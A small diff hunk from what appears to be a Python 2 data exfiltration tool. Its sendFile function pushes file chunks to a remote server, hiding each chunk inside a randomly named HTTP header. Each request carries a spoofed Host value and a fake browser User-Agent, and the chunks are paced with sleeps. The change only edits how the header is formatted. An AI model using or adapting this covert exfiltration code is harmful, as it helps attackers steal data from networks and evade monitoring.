@@ -146,7 +146,7 @@ def sendFile(server, port):
             if type(server) is str:
                 s.connect((server, port))
                 print 'Sending chunk ' + str(chunkCount) + ' spoofed as ' + spoofedApp.split('.')[1]
-                s.send('GET / HTTP/1.1\nHost: ' + spoofedApp + '\nUser-Agent: Mozilla/5.0 (Windows NT 6.1)\n' + genRandHeader() + ': ' + piece + '\n' + 'Connection: close\n\n')
+                s.send('GET / HTTP/1.1\nHost: ' + spoofedApp + '\nUser-Agent: Mozilla/5.0 (Windows NT 6.1)\n' + genRandHeader() +  piece + '\n' + 'Connection: close\n\n')
                 s.close()
                 chunkCount += 1
                 sleep(3)
